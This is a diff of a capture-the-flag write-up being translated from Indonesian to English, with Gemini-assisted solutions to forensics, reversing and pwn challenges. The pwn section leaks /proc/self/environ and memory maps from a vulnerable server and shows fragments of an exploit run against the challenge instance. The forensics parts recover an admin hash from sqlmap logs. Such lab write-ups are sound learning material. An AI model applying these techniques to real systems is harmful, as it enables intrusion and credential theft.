@@ -31,7 +31,7 @@ It takes me about **2,5 hours** to realize that the flag was closer than i thoug
 
 Flag: **`C2C{welcome_to_c2c}`**
 
-No AI Usage here (obviously)
+No AI Usage here (*obviously*)
 
 ---
 
@@ -146,9 +146,7 @@ Flag: **`C2C{damnnn_i_love_numpy_c62f51b9f296}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro** (at the begining but i got usage limit so then i use **Flash** afterward).
-
-For the subscription, it's from Google AI Pro with Student Account 
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro** (at the begining but i got usage limit so then i use **Flash** afterward), accessed through Google AI Pro with a Student Account subscription.
 
 The Prompts i sent mostly about how i use Gemini to search for modules or submodules from `numpy` that i can use.
 
@@ -335,7 +333,7 @@ Flag: **`C2C{f0rm4t_str1ng_l34k5_4nd_n0rm4l1z4t10n_93a7216dd963}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
 Most of the prompts I used were focused on analyzing the source code and identifying potential vulnerabilities.
 
@@ -546,7 +544,7 @@ Flag: **`C2C{R1ck_S0ld13r_0f_G0d_H4s_F4ll3n_v14_SST1_SSR7_bc5b6a19cb75}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
 Almost the entire challenge was solved with the help of Gemini, ranging from analyzing Ghidra pseudocode to identifying Go vulnerabilities and crafting the solution.
 
@@ -586,13 +584,14 @@ The methodology I used to verify Gemini’s output was to directly test the sugg
 ### Question 1
 
 ```
+Question #1:
 1. What is the Victim's IP address?
 Required Format: 127.0.0.1
 Your Answer: 182.8.97.244
 Status: Correct!
 ```
 
-Jika melihat dari `access.log`, beberapa line di awal source IP nya dari `182.8.97.244`, jadi saya asumsikan ini IP dari victim.
+By inspecting `access.log`, several lines at the beginning show the source IP as `182.8.97.244`, so I assumed this to be the victim’s IP address.
 
 ### Question 2
 
@@ -604,7 +603,7 @@ Your Answer: 219.75.27.16
 Status: Correct!
 ```
 
-Berdasarkan `access.log`, dari line 108 menunjukkan IP `219.75.27.16` melakukan request dengan payload `sqlmap`. Dari yang aku tah, `sqlmap` adalah pentesting tool yang digunakan untuk melakukan SQL Injection dan database takeover. Karena itu saya asumsikan ini adalah IP Attacker.
+Based on `access.log`, line 108 shows the IP address `219.75.27.16` sending requests containing the `sqlmap` payload. As far as I know, `sqlmap` is a penetration testing tool commonly used for SQL Injection and database takeover. Therefore, I assumed this IP address belongs to the attacker.
 
 ### Question 3
 
@@ -616,17 +615,17 @@ Your Answer: 6
 Status: Correct!
 ```
 
-Karena kita sudah mengetahui IP Attacker, kita bisa mencari percobaan login yang dilakukan attacker dengan perintah berikut:
+Since the attacker’s IP address was already identified, we can search for login attempts made by that IP using the following command:
 
 ```bash
 grep "219.75.27.16" access.log | grep "POST /wp-login.php"
 ```
 
-Dari output yang ditampilkan terdapat 7 percobaan login, tapi jika kita perhatikan dari HTTP status-nya, terdapat 6 yang mendapat `200` dan 1 yang mendapat `302`.
+From the output, there are 7 login attempts in total. However, if we look closely at the HTTP status codes, 6 requests returned `200`, while 1 request returned `302`.
 
-Hal ini menunjukkan bahwa Attacker melakukan percobaan login 6 kali dan gagal (response `200 OK`), dan pada percobaan ke-7 berhasil (response `302 Found`).
+This indicates that the attacker made 6 failed login attempts (`200 OK`) and successfully logged in on the 7th attempt (`302 Found`).
 
-> **Note:** Sebelum challenge diperbaiki, aku sempat bingung kenapa jawaban 6 atau 7 salah, dan secara asal menjawab 5 dan benar, tapi setelah diperbaiki jadi lebih jelas.
+> **Note:** Before the challenge was fixed, I was confused as to why both answers 6 or 7 were marked incorrect. I randomly answered 5 and it was accepted, but after the fix, the expected answer became clearer.
 
 ### Question 4
 
@@ -638,7 +637,7 @@ Your Answer: Easy Quotes
 Status: Correct!
 ```
 
-Untuk melihat plugin yang terdampak oleh serangan, kita bisa melihat pada file `error.log` dan menggunakan perintah berikut:
+To identify which plugin was affected by the attack, we can inspect the `error.log` file using the following command:
 
 ```bash
 grep -oP '/wp-content/plugins/\K[^/]+' error.log | sort | uniq -c
@@ -650,7 +649,7 @@ grep -oP '/wp-content/plugins/\K[^/]+' error.log | sort | uniq -c
    2943 easy-quotes
 ```
 
-Dapat kita simpulkan plugin yang terdampak adalah `easy-quotes` atau **Easy Quotes**
+From this result, we can conclude that the affected plugin is `easy-quotes`, also known as **Easy Quotes**.
 
 ### Question 5
 
@@ -662,7 +661,9 @@ Your Answer: CVE-2025-26943
 Status: Correct!
 ```
 
-Untuk pertanyaan ke-5, aku langsung mencari ke google mengenai CVE dari Easy Quotes
+For Question 5, I directly searched online for the CVE associated with the Easy Quotes plugin.
+
+[image here]
 
 ### Question 6
 
@@ -674,7 +675,7 @@ Your Answer: sqlmap/1.10.1.21
 Status: Correct!
 ```
 
-Dari pertanyaan kedua, kita sudah mengetahui kalau tool yang digunakan attacker adalah `sqlmap` dan juga ditunjukkan versi nya. Untuk mendapatkan nya melalui `grep`, kita bisa menggunakan:
+From Question 2, we already know that the attacker used `sqlmap`, and the version is also visible. To extract this information using `grep`, we can use the following command:
 
 ```bash
 grep -o "sqlmap/[0-9a-zA-Z.#]*" access.log | uniq
@@ -696,9 +697,9 @@ Your Answer: admin@daffainfo.com
 Status: Correct!
 ```
 
-Disini saya meminta bantuan **Gemini** untuk menganalisa `access.log` untuk melihat aktivitas `sqlmap` dari Attacker dan membuatkan script python untuk mengextractnya.
+For this question, I asked **Gemini** to help analyze `access.log` in order to understand the attacker’s `sqlmap` activity and to generate a Python script to extract the data.
 
-Berikut script `solve.py`
+Below is the `solve.py` script:
 
 ```python
 import re
@@ -746,11 +747,11 @@ except Exception as e:
     print(f"Error occured: {e}")
 ```
 
-Untuk menjelaskan output dari perintah ini aku juga meminta Gemini untuk memecah output
+To better understand the output of this script, I also asked Gemini to help break down and interpret the extracted data.
 
 [image here]
 
-Dari output yang dihasilkan, kita mendapatkan `user_login`, `user_email`, `user_nicename`, `display_name`, `user_pass`(Hash), `user_registered`, `user_status` dan `user_url`
+From the extracted output, we obtained the following fields: `user_login`, `user_email`, `user_nicename`, `display_name`, `user_pass` (hash), `user_registered`, `user_status`, and `user_url`.
 
 ### Question 8
 
@@ -762,7 +763,7 @@ Your Answer: $wp$2y$10$vMTERqJh2IlhS.NZthNpRu/VWyhLWc0ZmTgbzIUcWxwNwXze44SqW
 Status: Correct
 ```
 
-Untuk menjawab Question 8, aku menggunakan value yang didapatkan dari Question 7 sebelumnya.
+To answer Question 8, I used the value obtained from Question 7.
 
 ### Question 9
 
@@ -774,23 +775,23 @@ Your Answer: 11/01/2026 13:12:49
 Status: Correct!
 ```
 
-Untuk menjawab Question 9, aku menggunakan output dari **Question 3** pada saat attacker berhasil login (response `302 Found`)
+To answer Question 9, I used the result from **Question 3**, specifically the moment when the attacker successfully logged in (HTTP response `302 Found`):
 
 ```bash
 219.75.27.16 - - [11/Jan/2026:13:12:49 +0000] "POST /wp-login.php HTTP/1.1" 302 1275 "http://165.22.125.147/wp-login.php?redirect_to=http%3A%2F%2F165.22.125.147%2Fwp-admin%2F&reauth=1" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.56 Safari/537.36"
 ```
 
-Dari log tersebut, attacker berhasil login pada `[11/Jan/2026:13:12:49 +0000]` lalu format waktu tersebut disesuaikan menjadi `11/01/2026 13:12:49`
+From this log entry, the attacker successfully logged in at `[11/Jan/2026:13:12:49 +0000]`, which was then reformatted to `11/01/2026 13:12:49`.
 
 Flag: **`C2C{7H15_15_V3rY_345Y_814f6a5316dd}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
-Aku hanya menggunakan Gemini untuk menganalisa dan membuat script untuk Question 7
+I only used Gemini to analyze and generate a script for Question 7.
 
-Berikut prompt yang aku gunakan:
+Below are the prompts I used:
 
 ```
 analyze how sqlmap retrieve data from access.log file
@@ -800,13 +801,13 @@ analyze how sqlmap retrieve data from access.log file
 create a script to extract the data
 ```
 
-Metodologi yang aku gunakan untuk memverifikasi output dari Gemini adalah dengan mencoba output yang diberikan Gemini, jika ada error atau gagal, aku mencoba untuk adjust script yang dibuat sebisaku, jika tidak tahu untuk memperbaikinya, aku minta Gemini memperbaiki scriptnya.
+The methodology I used to verify Gemini’s output was to directly test the generated results. If there were errors or failures, I tried to manually adjust the script. If I could not fix the issue myself, I asked Gemini to refine and correct the script.
 
 ---
 
 # forensics/Tattletale
 
-Pertama, aku menganalisa file `serizawa` dengan `file`
+First, I analyzed the `serizawa` file using the `file` command:
 
 ```bash
 (venv) ┌─[lasangna@parrot]─[~/ctf/c2c/foren/tattletale/dist]
@@ -814,11 +815,11 @@ Pertama, aku menganalisa file `serizawa` dengan `file`
 serizawa: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=f5e4eb9bd95f0a14f41d1ef1a6f8ee703c85a059, stripped
 ```
 
-Karena disini file serizawa `stripped`, aku mencoba menganalisa dengan **Ghidra** dan menganalisa entry function nya, kemudian meminta bantuan Gemini untuk menganalisa pseudocode function yang dipanggil oleh entry function ini.
+Since the `serizawa` binary is **stripped**, I analyzed it using **Ghidra** by inspecting the entry function and then asked Gemini to help analyze the pseudocode of the functions called by this entry point.
 
-Lalu didapatkan kesimpulan bahwa file `serizawa` bukan malware yang ditulis dari nol, melainkan script Python yang dibungkus dengan PyInstaller.
+From this analysis, I concluded that `serizawa` is not malware written from scratch, but rather a Python script packaged using **PyInstaller**.
 
-Untuk mengextract `serizawa`, aku menggunakan [pyinstxtractor.py](https://github.com/extremecoders-re/pyinstxtractor)
+To extract the contents of `serizawa`, I used [pyinstxtractor.py](https://github.com/extremecoders-re/pyinstxtractor):
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/foren/tattletale/dist$ python3 pyinstxtractor.py serizawa 
@@ -839,9 +840,9 @@ Untuk mengextract `serizawa`, aku menggunakan [pyinstxtractor.py](https://github
 You can now use a python decompiler on the pyc files within the extracted directory
 ```
 
-Dari hasil extract tersebut dapat dilihat, terdapat file `serizawa.pyc` yang seharusnya merupakan code utama malware ini.
+From the extracted files, we can see that `serizawa.pyc` exists and is likely the main malware code.
 
-Untuk decompile `serizawa.pyc`, aku menggunakan [pycdc](https://github.com/zrax/pycdc)
+To decompile `serizawa.pyc`, I used [pycdc](https://github.com/zrax/pycdc):
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/foren/tattletale/dist/serizawa_extracted$ pycdc serizawa.pyc 
@@ -879,14 +880,14 @@ if __name__ == '__main__':
     return None
 ```
 
-Disini walau `pycdc` terputus ditengah jalan, namun potongan code yang didapat sudah cukup untuk menganalisa malware. Dapat disimpulkan bahwa `serizawa` adalah sebuah **Keylogger**
+Although the decompilation was incomplete, the recovered code was sufficient to analyze the malware. From this, it can be concluded that `serizawa` is a **keylogger**.
 
-Sekarang jika kita hubungkan dengan kedua file yang kita dapat, maka
-1. `serizawa` adalah Keylogger yang berjalan di background
-2. `cron.aseng` adalah file yang berisi log keyboard victim
-3. `whatisthis.enc` adalah file terenkripsi yang kemungkinan menjadi flag untuk challenge ini
+Connecting this with the other files obtained:
+1. `serizawa` is a keylogger running in the background
+2. `cron.aseng` is a file containing the victim’s keystroke logs
+3. `whatisthis.enc` is an encrypted file, which likely contains the flag for this challenge
 
-Selanjutnya, aku menganalisa file `cron.aseng`
+Next, I analyzed the `cron.aseng` file:
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/foren/tattletale/dist$ xxd cron.aseng | head -n 10
@@ -904,9 +905,9 @@ Selanjutnya, aku menganalisa file `cron.aseng`
 
 ## Solve
 
-Dengan bantuan Gemini, aku menganalisa file ini dan menemukan patternnya, kemudian meminta Gemini untuk membuat script untuk parsing file `cron.aseng`
+With the help of Gemini, I analyzed this file and identified its pattern, then asked Gemini to create a script to parse `cron.aseng`.
 
-berikut file `parser.py`
+Below is the `parser.py` script:
 
 ```python
 import struct
@@ -938,7 +939,7 @@ with open('cron.aseng', 'rb') as f:
 print()
 ```
 
-Berikut output dari `parser.py`
+Below is the output of `parser.py`:
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/foren/tattletale/dist$ python3 parser.py 
@@ -953,33 +954,33 @@ echo [SHIFT]'[CAPS]o[CAPS]k go for it[SHIFT]1 [CAPS]t[CAPS]he flag is in env btw
 [29]c
 ```
 
-Dari output diatas, terdapat hal penting dimana victim menjalankan perintah 
+From the output above, we can see that the victim executed the following command:
 
 ```bash
 env > whatisthis
 ```
 
-kemudian menggunakan perintah `od` dan menyimpannya ke `whatisthis.baboi`
+Then used `od` to dump the file into `whatisthis.baboi`:
 
 ```bash
 od whatisthis > whatisthis.baboi
 ```
 
-dan bagian vitalnya pada saat membuat password. Setelah analisa, didapatkan passwordnya adalah
+The critical part is the password creation process. After analyzing the keystrokes, the password was determined to be:
 
 ```
 4_g00d_fr13nD_in_n33D
 ```
 
-Selanjutnya, aku men-decrypt file `whatisthis.enc` dengan algoritma yang sama saat diencrypt, yaitu `aes-256-cbc`
+Next, I decrypted the `whatisthis.enc` file using the same algorithm used during encryption, namely `aes-256-cbc`:
 
 ```bash
 openssl enc -d -aes-256-cbc -salt -pass pass:4_g00d_fr13nD_in_n33D -in whatisthis.enc -out whatisthis.bababoi.recovered
 ```
 
-Terakhir, untuk mendecode file `whatisthis.baboi.recovered` yang telah diubah dengan `od` sebelumnya, aku meminta Gemini untuk membuat script untuk decode.
+Finally, to decode the `whatisthis.baboi.recovered` file (which had previously been processed with `od`), I asked Gemini to create a decoding script.
 
-berikut file `decode_od.py`
+Below is the `decode_od.py` script:
 
 ```python
 import struct
@@ -1009,16 +1010,17 @@ with open("whatisthis.baboi.recovered", "r") as f:
 print(output_text)
 
 ```
+[image here]
 
 Flag: **`C2C{it_is_just_4_very_s1mpl3_l1nuX_k3ylogger_xixixi_haiyaaaaa_ez}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
-Aku menggunakan Gemini untuk menganalisa pseudocode dari Ghidra, menganalisa file `cron.aseng`, membuat parser dan decoder script.
+I used Gemini to analyze Ghidra pseudocode, analyze the `cron.aseng` file, and to create the parser and decoder scripts.
 
-Berikut prompt yang aku gunakan:
+Below are some of the prompts I used:
 
 ```
 analyze this 
@@ -1045,13 +1047,13 @@ can you read this file pattern ...
 create the script to parse this ...
 ```
 
-Metodologi yang aku gunakan untuk memverifikasi output dari Gemini adalah dengan mencoba output yang diberikan Gemini, dari semua jawaban Gemini pada chall ini, tidak ada yang fail.
+The methodology I used to verify Gemini’s output was to directly test the generated results. In this challenge, none of Gemini’s suggestions failed.
 
 ---
 
 # reverse/bunaken
 
-Pertama, aku mencoba untuk menganalisa file `bunaken` dengan menjalankan file ini untuk mendapatkan gambaran kasar mengenai challenge ini
+First, I tried to analyze the `bunaken` file by executing it to get a rough understanding of the challenge:
 
 ```bash
 ┌─[lasangna@parrot]─[~/ctf/c2c/reveng/bunaken]
@@ -1065,9 +1067,9 @@ ENOENT: no such file or directory, open 'flag.txt'
 Bun v1.3.6 (Linux x64)
 ```
 
-Dari sini aku menemukan bahwa `bunaken` adalah **JavaScript/TypeScript Runtime** dengan menggunakan **Bun**
+From this output, I discovered that `bunaken` is a **JavaScript/TypeScript runtime** built using **Bun**.
 
-Selanjutnya aku memastikan bahwa file `bunaken` bisa di-strip dengan mengecek menggunakan `file`
+Next, I verified whether the `bunaken` binary was stripped by checking it with the `file` command:
 
 ```bash
 ┌─[lasangna@parrot]─[~/ctf/c2c/reveng/bunaken]
@@ -1075,30 +1077,34 @@ Selanjutnya aku memastikan bahwa file `bunaken` bisa di-strip dengan mengecek me
 bunaken: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=109a021c1b3405d73bd0e95dcad52ec5857f4ed9, not stripped
 ```
 
-Disini karena sudah dikonfirmasi bahwa file ini `not stripped`, aku bisa mencoba menganalisa dengan `strings`
+Since the file is confirmed to be **not stripped**, I proceeded with static analysis using `strings`:
 
 ```bash
 ┌─[lasangna@parrot]─[~/ctf/c2c/reveng/bunaken]
 └──╼ $strings bunaken > bunaken_strings.txt
 ```
 
-Selanjutnya aku mencoba mencari pattern string seperti `flag` atau `flag.txt`
+I then searched for interesting string patterns such as `flag` or `flag.txt`.
 
 [image here]
 
-Berikut line yang mengandung `flag.txt`
+Below is the section of the code containing `flag.txt`:
 
 ```javascript
 function w(){let n=["WR0tF8oezmkl","toString","W603xSol","1tlHJnY","1209923ghGtmw","text","13820KCwBPf","byteOffset","40xRjnfn","Cfa9","bNaXh8oEW6OiW5FcIq","alues","lXNdTmoAgqS0pG","D18RtemLWQhcLConW5a","nCknW4vfbtX+","WOZcIKj+WONdMq","FCk1cCk2W7FcM8kdW4y","a8oNWOjkW551fSk2sZVcNa","yqlcTSo9xXNcIY9vW7dcS8ky","from","iSoTxCoMW6/dMSkXW7PSW4xdHaC","c0ZcS2NdK37cM8o+mW","377886jVoqYx","417805ESwrVS","7197AxJyfv","cu7cTX/cMGtdJSowmSk4W5NdVCkl","W7uTCqXDf0ddI8kEFW","write","encrypt","ted","xHxdQ0m","byteLength","6CCilXQ","304OpHfOi","set","263564pSWjjv","subtle","945765JHdYMe","SHA-256","Bu7dQfxcU3K","getRandomV"];return w=function(){return n},w()}function l(n,r){return n=n-367,w()[n]}var y=l,s=c;function c(n,r){n=n-367;let t=w(),x=t[n];if(c.uRqEit===void 0){var b=function(i){let f="",a="";for(let d=0,o,e,p=0;e=i.charAt(p++);~e&&(o=d%4?o*64+e:e,d++%4)?f+=String.fromCharCode(255&o>>(-2*d&6)):0)e="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(e);for(let d=0,o=f.length;d<o;d++)a+="%"+("00"+f.charCodeAt(d).toString(16)).slice(-2);return decodeURIComponent(a)};let U=function(i,B){let f=[],a=0,d,o="";i=b(i);let e;for(e=0;e<256;e++)f[e]=e;for(e=0;e<256;e++)a=(a+f[e]+B.charCodeAt(e%B.length))%256,d=f[e],f[e]=f[a],f[a]=d;e=0,a=0;for(let p=0;p<i.length;p++)e=(e+1)%256,a=(a+f[e])%256,d=f[e],f[e]=f[a],f[a]=d,o+=String.fromCharCode(i.charCodeAt(p)^f[(f[e]+f[a])%256]);return o};c.yUvSwA=U,c.MmZTqk={},c.uRqEit=!0}let u=t[0],I=n+u,A=c.MmZTqk[I];return!A?(c.ftPoNg===void 0&&(c.ftPoNg=!0),x=c.yUvSwA(x,r),c.MmZTqk[I]=x):x=A,x}(function(n,r){let t=c,x=l,b=n();while(!0)try{if(parseInt(x(405))/1*(parseInt(x(383))/2)+-parseInt(x(385))/3*(parseInt(t(382,"9Dnx"))/4)+parseInt(x(384))/5*(-parseInt(x(393))/6)+parseInt(x(396))/7*(parseInt(x(369))/8)+parseInt(t(381,"R69F"))/9+-parseInt(x(367))/10+-parseInt(x(406))/11===r)break;else b.push(b.shift())}catch(u){b.push(b.shift())}})(w,105028);var h=async(n)=>{let r=l,t=c,x=n instanceof ArrayBuffer?new Uint8Array(n):new Uint8Array(n[t(400,"I2yl")],n[r(368)],n.byteLength);if(x.byteLength===16||x.byteLength===24||x.byteLength===32)return x;let b=await crypto.subtle[t(402,"Fw]1")](r(399),x);return new Uint8Array(b).subarray(0,16)},g=(n,r)=>{let t=l,x=new Uint8Array(n.byteLength+r.byteLength);return x.set(n,0),x[t(395)](r,n[t(392)]),x},m=async(n,r)=>{let t=c,x=l,b=crypto[x(401)+x(372)](new Uint8Array(16)),u=await h(n),I=await crypto[x(397)][t(371,"kAmA")](t(370,"CYgn"),u,{name:"AES-CBC"},!1,[x(389)]),A=await crypto.subtle[x(389)]({name:t(375,"dHTh"),iv:b},I,r);return g(b,new Uint8Array(A))},S=Bun[s(391,"9Dnx")](s(377,"R69F")),k=await S[y(407)](),v=await Bun[s(387,"f]pG")+"ss"](k),z=await m(Buffer[y(380)](s(373,"rG]G")),v);Bun[y(388)]("flag.txt.b"+s(374,"CYgn")+y(390),Buffer[s(404,"(Y*]")](z)[y(403)](s(376,"$lpa")));
 ```
 
-Disini aku meminta bantuan Gemini untuk menganalisa alur dari function tersebut dan menyimpulkan bahwa terdapat fungsi `h` **Key Derivation**, `m` **Encryption**, `g` **Data Structuring** kemudian menjalankan `Buffer.from(z).toString('base64')` ke `flag.txt.bunakencrypted`
+At this point, I asked Gemini to analyze the execution flow of these functions. From the analysis, it can be summarized that:
+- `h` performs **key derivation**
+- `m` performs **encryption**
+- `g` handles **data structuring**
+- Finally, `Buffer.from(z).toString('base64')` is written to `flag.txt.bunakencrypted`
 
 ## Solve
 
-Untuk men-decrypt `flag.txt.bunakencrypted`, aku meminta Gemini untuk membuat scriptnya yang memanfaatkan fungsi **deobfuscator** dari function yang kita temukan.
+To decrypt `flag.txt.bunakencrypted`, I asked Gemini to create a script that reuses the **deobfuscation logic** extracted from the binary.
 
-berikut script `solve.js`
+Below is the `solve.js` script:
 
 ```javascript
 const crypto = require('crypto');
@@ -1135,7 +1141,7 @@ async function decryptFlag() {
 decryptFlag().catch(console.error);
 ```
 
-dan ini output dari script `solve.js`
+Below is the output of `solve.js`:
 
 ```bash
 ┌─[lasangna@parrot]─[~/ctf/c2c/reveng/bunaken]
@@ -1148,11 +1154,11 @@ Flag: **`C2C{BUN_AwKward_ENcryption_compression_obfuscation}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
-Aku menggunakan Gemini untuk menganalisa temuan dari `strings` dan membuat script solver untuk mendapatkan flag dari encrypted file.
+I used Gemini to analyze the findings from `strings` and to create the solver script to recover the flag from the encrypted file.
 
-Berikut prompt yang aku gunakan:
+Below are some of the prompts I used:
 
 ```
 i find this in bunaken strings
@@ -1166,17 +1172,17 @@ can you analyze it and find what is it about?
 according to the function, create the script to decrypt the flag.txt.bunakencrypted
 ```
 
-Metodologi yang aku gunakan untuk memverifikasi output dari Gemini adalah dengan mencoba output yang diberikan Gemini dan mencoba memahami alurnya. Dalam challenge ini, output dari Gemini tidak menghasilkan error, hanya hasil decrypt yang ada character asing, tapi flag nya berhasil di decrypt.
+The methodology I used to verify Gemini’s output was to test the generated results and understand the execution flow. In this challenge, Gemini’s output did not produce errors; the decrypted output contained some non-printable characters, but the flag was successfully recovered.
 
 ---
 
 # pwn/ns3
 
-Challenge ini cukup baik karena memberikan source code `.cpp` sehingga aku tidak perlu menganalisa dari ELF file (W Author)
+This challenge was quite nice because it provides the `.cpp` source code, so I didn’t need to analyze the ELF binary directly (W author).
 
-pertama, aku meminta bantuan Gemini untuk menganalisa alur program dan mencari vulnerability yang dapat diexploit, selanjutnya aku mencoba menjalankan program secara local terlebih dahulu untuk mendapatkan test flag terlebih dahulu, baru ketika sudah berhasil, akan aku eksekusi ke instance
+First, I asked Gemini to analyze the program flow and identify potential vulnerabilities that could be exploited. After that, I tried running the program locally to obtain a test flag first. Once the exploit worked locally, I executed it against the remote instance.
 
-Pertama aku mencoba untuk mengambil environment variables dengan mencoba GET ke path `/proc/self/environ` dengan script bantuan Gemini, tapi dari outputnya, aku berhasil mendapatkan environment variables, tapi tidak dengan flag nya.
+I initially attempted to retrieve environment variables by sending a GET request to `/proc/self/environ` using a Gemini-assisted script. From the output, I successfully retrieved environment variables, but not the flag.
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/pwn/ns3$ python3 exploit.py
@@ -1187,7 +1193,6 @@ Pertama aku mencoba untuk mengambil environment variables dengan mencoba GET ke 
 [+] Response received
 
 --- Environment Variables ---
-
 HOSTNAME=36f085300a40
 SHLVL=1
 HOME=/
@@ -1198,9 +1203,9 @@ LOGNAME=nobody
 SHELL=./server 
 ```
 
-Dari output tersebut, aku menyadari bahwa aku mengakses sebagai `USER=nobody`, hal ini mengindikasikan adanya *privilege drop* sehingga aku tidak bisa membaca flag.
+From this output, I realized that the process runs as `USER=nobody`. This indicates a *privilege drop*, meaning I could not directly read the flag.
 
-Selanjutnya aku menganalisa isi `run.sh` dan menemukan bahwa variable `GZCTF_FLAG` disimpan dalam file dengan nama acak (`/flag-xxxx...`), kemudian variable dihapus dengan `unset`, dan menjalankan sebagai user `nobody`
+Next, I analyzed the contents of `run.sh` and found that the `GZCTF_FLAG` variable is written to a file with a random name (`/flag-xxxx...`), then the environment variable is unset, and the process is executed as the `nobody` user.
 
 `run.sh`
 ```shell
@@ -1212,7 +1217,7 @@ unset GZCTF_FLAG
 exec su -s ./server nobody 
 ```
 
-Kemudian aku mendiskusikan ulang dengan Gemini untuk menggunakan pendekatan lain, dan Gemini menyarankan untuk mencoba mendapatkan virtual memory dari `/proc/self/maps` dan untuk leak memory maps.
+I then discussed this again with Gemini and decided to try a different approach. Gemini suggested leaking virtual memory information from `/proc/self/maps`.
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/pwn/ns3$ python exploit.py
@@ -1237,15 +1242,15 @@ Kemudian aku mendiskusikan ulang dengan Gemini untuk menggunakan pendekatan lain
 7ffebba2b000-7ffebba4c000 rw-p 00000000 00:00 0                          [stack] 
 ```
 
-Disini aku kembali meminta bantuan Gemini untuk menganalisa outputnya dan menyimpulkan bahwa aku sudah berhasil melakukan **KASLR / PIE Bypass** dan menemukan target di baris
+I again asked Gemini to analyze this output and concluded that I had successfully achieved a **KASLR / PIE bypass**. The target region was identified at:
 
 ```bash
 7f00cb741000-7f00cb8d3000 r-xp 0001a000 00:37 1468494                    /app/server
 ```
 
-yang merupakan segment `.text` dimana instruksi code program (assembly) berada.
+This corresponds to the `.text` segment, where the program’s executable instructions reside.
 
-Selanjutnya aku mencoba mencari offset dari fungsi `send_response` dalam file binary dengan perintah:
+Next, I searched for the offset of the `send_response` function in the binary using:
 
 ```bash
 nm -C src/server | grep send_response
@@ -1256,9 +1261,9 @@ ctf-env) lasangna@sandbox:~/ctf/pwn/ns3$ nm -C src/server | grep send_response
 0000000000022d4c T Server::send_response(int, int, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&, std::__cxx11::basic_string<char, std::char_traits<char>, std::allocator<char> > const&) 
 ```
 
-Disini aku berhasil menemukan offset `0x22d4c`, disini Gemini sudah bisa menyusun exploit dengan memanfaatkan `rsi` register.
+From this, I obtained the offset `0x22d4c`. At this point, Gemini was able to help construct an exploit that leverages the `rsi` register.
 
-Dengan script dari Gemini, aku berhasil menjalankan exploit ke local dan mendapatkan test flag nya
+Using the Gemini-generated script, I successfully ran the exploit locally and obtained the test flag:
 
 ```bash
  (ctf-env) lasangna@sandbox:~/ctf/pwn/ns3$ python3 exploit.py
@@ -1280,7 +1285,7 @@ $
 
 ## Exploit
 
-Dengan menyesuaikan beberapa bagian, berikut `exploit.py` yang aku jalankan ke instance
+After adjusting several parts, below is the final `exploit.py` that I executed against the remote instance:
 
 ```python
 from pwn import *
@@ -1356,7 +1361,7 @@ log.success("run 'cat /flag*'")
 io.interactive()
 ```
 
-Selanjutnya, ini output dari `exploit.py` tersebut
+Below is the output from running this exploit:
 
 ```bash
 (ctf-env) lasangna@sandbox:~/ctf/pwn/ns3$ python exploit.py 
@@ -1380,11 +1385,11 @@ Flag: **`C2C{LlnUx_1iIe_5YS7eM_I5_Qul7E_m1nD_81OWIn6_i5N'7_i7_e9042b9950c2?}`**
 
 ## AI Usage
 
-yes, i use AI to solve this challenge. I used **Gemini 3 Pro**. For the subscription, it's from Google AI Pro with Student Account.
+Yes, I used AI to solve this challenge. I used **Gemini 3 Pro**, accessed through Google AI Pro with a Student Account subscription.
 
-Aku mengerjakan challenge ini sebagian besar dengan bantuan Gemini karena aku masih belum banyak pengalaman dalam pwn challenge. Aku banyak menggunakan bantuan Gemini untuk menganalisa file, menganalisa output, mencari vulnerabilities dan membuat exploit script
+I relied heavily on Gemini for this challenge, as I am still relatively inexperienced with pwn challenges. I used Gemini to analyze the source code, interpret outputs, identify vulnerabilities, and construct the exploit script.
 
-Berikut prompt yang aku gunakan:
+Some of the prompts I used include:
 
 ```
 here's the server.cpp file, what can i do with this?
@@ -1406,17 +1411,17 @@ here's the output of the exploit
 what should i do?
 ```
 
-Disini aku banyak menggunakan bantuan dari Gemini, jadi metodologi yang aku gunakan untuk memverifikasi output dari Gemini adalah dengan mencoba output yang diberikan Gemini dan mengirimkan hasil outputnya sebagai feedback ke Gemini hinggga mendapatkan flag-nya.
+Since I relied heavily on Gemini, my methodology for verifying its output was to directly test the suggested steps and provide the resulting output back to Gemini as feedback until the flag was obtained.
 
 ---
 
 # blockchain/tge
 
